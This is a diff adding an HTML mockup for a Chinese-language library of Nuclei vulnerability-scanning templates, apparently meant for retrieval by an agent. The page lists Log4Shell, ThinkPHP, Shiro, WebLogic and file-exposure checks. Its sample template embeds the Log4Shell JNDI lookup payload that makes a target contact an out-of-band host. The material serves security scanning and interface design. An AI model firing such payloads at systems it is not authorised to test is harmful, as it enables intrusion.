@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>POC 库 · 方案 C2：素雅台账</title>
+<style>
+	:root {
+		--bg: #fafafa;
+		--panel: #ffffff;
+		--line: #0000000f;
+		--line-strong: #0000001a;
+		--text: #000000d9;
+		--dim: #00000057;
+		--accent: #0960bd;
+		--accent-dim: #0960bd0d;
+		--mono: "SF Mono", ui-monospace, Menlo, Consolas, monospace;
+	}
+	* { box-sizing: border-box; margin: 0; padding: 0; }
+	body {
+		background: var(--bg); color: var(--text);
+		font: 13px/1.6 -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
+		padding: 24px 28px 60px;
+	}
+	.note { text-align: center; color: var(--dim); margin-bottom: 22px; }
+	.note b { color: var(--accent); }
+
+	/* ---- 页头：一行文字标题，无卡片无色块，留白撑气质 ---- */
+	.head { display: flex; align-items: baseline; gap: 14px; margin-bottom: 6px; }
+	.head h1 { font-size: 20px; font-weight: 600; letter-spacing: .01em; }
+	.head .sub { font-size: 12.5px; color: var(--dim); }
+	.head .ops { margin-left: auto; display: flex; gap: 8px; align-self: center; }
+	.btn {
+		height: 32px; padding: 0 14px; border-radius: 7px; font-size: 12.5px; cursor: pointer;
+		border: 1px solid var(--line-strong); background: var(--panel); color: var(--text); transition: border-color .12s;
+	}
+	.btn:hover { border-color: #0003; }
+	.btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+	.btn.primary:hover { background: #0a6cd5; }
+	.divider { height: 1px; background: var(--line-strong); margin: 14px 0 12px; }
+
+	/* ---- 过滤：内联文字链，无框无底色 ---- */
+	.filters { display: flex; align-items: center; gap: 14px; margin-bottom: 10px; }
+	.filters input {
+		width: 320px; height: 32px; border: none; border-bottom: 1px solid var(--line-strong);
+		background: transparent; padding: 0 2px 6px; font-size: 13px; outline: none; border-radius: 0;
+	}
+	.filters input:focus { border-bottom-color: var(--accent); }
+	.filters input::placeholder { color: #0003; }
+	.tab { font-size: 12.5px; color: var(--dim); cursor: pointer; padding-bottom: 6px; border-bottom: 2px solid transparent; }
+	.tab:hover { color: var(--text); }
+	.tab.on { color: var(--accent); border-bottom-color: var(--accent); font-weight: 500; }
+	.filters .result { margin-left: auto; font-size: 12px; color: var(--dim); }
+
+	/* ---- 素表：细分隔线，无卡片无阴影，等级仅一枚小圆点 + 文字 ---- */
+	table { width: 100%; border-collapse: collapse; }
+	thead th {
+		text-align: left; font-size: 11px; font-weight: 500; color: var(--dim);
+		padding: 8px 12px; border-bottom: 1px solid var(--line-strong);
+		letter-spacing: .04em; text-transform: uppercase; font-size: 10.5px;
+	}
+	tbody td { padding: 10px 12px; border-bottom: 1px solid var(--line); vertical-align: middle; }
+	tbody tr.main { cursor: pointer; transition: background .1s; }
+	tbody tr.main:hover { background: #00000004; }
+	tbody tr.main.open { background: var(--accent-dim); }
+	td.id { font-family: var(--mono); font-size: 12px; color: var(--accent); }
+	td.name { font-size: 13px; max-width: 380px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+	.sev { display: inline-flex; align-items: center; gap: 7px; font-size: 12px; color: var(--text); }
+	.sev::before { content: ""; width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+	.sev.critical::before { background: #cf1322; } .sev.high::before { background: #d4380d; }
+	.sev.medium::before { background: #d46b08; } .sev.low::before { background: #0958d9; } .sev.info::before { background: #389e0d; }
+	td .tags { display: flex; gap: 5px; }
+	td .tags span {
+		font-family: var(--mono); font-size: 11px; color: var(--dim);
+		padding-bottom: 1px; border-bottom: 1px dashed #0000001f;
+	}
+	td.cve { font-family: var(--mono); font-size: 11.5px; color: #000000a6; }
+	td.when { font-size: 12px; color: var(--dim); font-variant-numeric: tabular-nums; white-space: nowrap; }
+	td.op button {
+		border: none; background: none; color: transparent; cursor: pointer; font-size: 12px; padding: 3px 6px; border-radius: 4px;
+	}
+	tr.main:hover td.op button, tr.main.open td.op button { color: var(--dim); }
+	td.op button:hover { color: #cf1322; background: #cf13220d; }
+	.caret { color: #0002; font-size: 9px; transition: transform .12s; display: inline-block; }
+	tr.main.open .caret { transform: rotate(90deg); color: var(--accent); }
+
+	/* ---- 展开：浅色代码面板（区别于暗色终端，整页更素） ---- */
+	tr.detail td { padding: 0 12px 14px 38px; border-bottom: 1px solid var(--line); cursor: default; }
+	.detail-inner {
+		background: #f6f8fa; border: 1px solid var(--line); border-radius: 8px; overflow: hidden;
+	}
+	.detail-meta {
+		display: flex; align-items: center; gap: 14px; padding: 7px 14px;
+		border-bottom: 1px solid var(--line); font-size: 11.5px; color: var(--dim); font-family: var(--mono);
+	}
+	.detail-meta .ops { margin-left: auto; display: flex; gap: 6px; }
+	.detail-meta .ops button {
+		border: none; background: transparent; color: var(--dim); font-size: 11.5px; cursor: pointer; padding: 2px 8px; border-radius: 4px;
+	}
+	.detail-meta .ops button:hover { color: var(--accent); background: var(--accent-dim); }
+	.detail-meta .ops button.danger:hover { color: #cf1322; background: #cf13220d; }
+	.detail pre {
+		margin: 0; padding: 13px 16px; font-family: var(--mono); font-size: 11.5px; line-height: 1.75;
+		color: #24292f; max-height: 280px; overflow: auto;
+	}
+</style>
+</head>
+<body>
+<div class="note">C2 · <b>素雅台账</b> —— 去卡片化：细线表格 + 下划线过滤 + 浅灰代码面板，靠留白与层级。点击行展开。</div>
+
+<div class="head">
+	<h1>POC 库</h1>
+	<span class="sub">Nuclei 模板中心 · 只读供 Agent 检索 · 共 128 个模板</span>
+	<span class="ops">
+		<button class="btn">导出清单</button>
+		<button class="btn primary">导入 yaml / zip</button>
+	</span>
+</div>
+<div class="divider"></div>
+
+<div class="filters">
+	<input placeholder="搜索 id、名称、标签、CVE…" />
+	<span class="tab on">全部</span>
+	<span class="tab">严重</span>
+	<span class="tab">高危</span>
+	<span class="tab">中危</span>
+	<span class="tab">低危</span>
+	<span class="tab">信息</span>
+	<span class="result">匹配 6 / 128</span>
+</div>
+
+<table>
+	<thead>
+		<tr><th style="width:24px"></th><th>模板 ID</th><th>等级</th><th>名称</th><th>标签</th><th>CVE</th><th>导入</th><th></th></tr>
+	</thead>
+	<tbody id="rows"></tbody>
+</table>
+
+<script>
+	const data = [
+		{ id: "CVE-2021-44228-log4j-rce", sev: "critical", name: "Apache Log4j2 JNDI 远程代码执行（Log4Shell）", tags: ["cve", "rce"], cve: "CVE-2021-44228", when: "10-12 14:03", file: "log4shell.yaml" },
+		{ id: "thinkphp-5023-rce", sev: "critical", name: "ThinkPHP 5.0.23 invokefunction 远程代码执行", tags: ["rce", "thinkphp"], cve: "—", when: "10-12 14:03", file: "thinkphp.yaml" },
+		{ id: "shiro-deserialization", sev: "high", name: "Apache Shiro rememberMe 反序列化命令执行", tags: ["deserialization", "shiro"], cve: "—", when: "10-11 09:41", file: "shiro.yaml" },
+		{ id: "weblogic-iiop-t3-weak", sev: "high", name: "WebLogic IIOP/T3 反序列化（CVE-2020-2883）", tags: ["cve"], cve: "CVE-2020-2883", when: "10-11 09:41", file: "weblogic.yaml" },
+		{ id: "springboot-env-exposure", sev: "medium", name: "Spring Boot actuator env 端点信息泄露", tags: ["exposure", "springboot"], cve: "—", when: "10-10 18:22", file: "springboot.yaml" },
+		{ id: "git-config-exposure", sev: "low", name: "Git 配置文件泄露（/.git/config）", tags: ["exposure", "git"], cve: "—", when: "10-09 11:05", file: "git.yaml" },
+	];
+	const sevLabel = { critical: "严重", high: "高危", medium: "中危", low: "低危", info: "信息" };
+	const sample = `id: CVE-2021-44228-log4j-rce
+
+info:
+  name: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)
+  severity: critical
+  tags: cve,rce
+  classification:
+    cve-id: CVE-2021-44228
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/a}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"`;
+	const rows = document.getElementById("rows");
+	let openIndex = 0;
+	function render() {
+		rows.innerHTML = data.map((d, i) => {
+			const main = `<tr class="main ${i === openIndex ? "open" : ""}" onclick="toggle(${i})">
+				<td><span class="caret">▶</span></td>
+				<td class="id">${d.id}</td>
+				<td><span class="sev ${d.sev}">${sevLabel[d.sev]}</span></td>
+				<td class="name">${d.name}</td>
+				<td><span class="tags">${d.tags.map((t) => `<span>${t}</span>`).join("")}</span></td>
+				<td class="cve">${d.cve}</td>
+				<td class="when">${d.when}</td>
+				<td class="op"><button>删除</button></td>
+			</tr>`;
+			const detail = i === openIndex
+				? `<tr class="detail" onclick="event.stopPropagation()"><td colspan="8"><div class="detail-inner">
+						<div class="detail-meta">
+							<span>来源 ${d.file}</span><span>导入 ${d.when}</span><span>${d.tags.join(", ")}</span>
+							<span class="ops"><button>复制全文</button><button class="danger">删除模板</button></span>
+						</div>
+						<pre>${sample}</pre>
+					</div></td></tr>`
+				: "";
+			return main + detail;
+		}).join("");
+	}
+	function toggle(i) { openIndex = openIndex === i ? -1 : i; render(); }
+	render();
+</script>
+</body>
+</html>
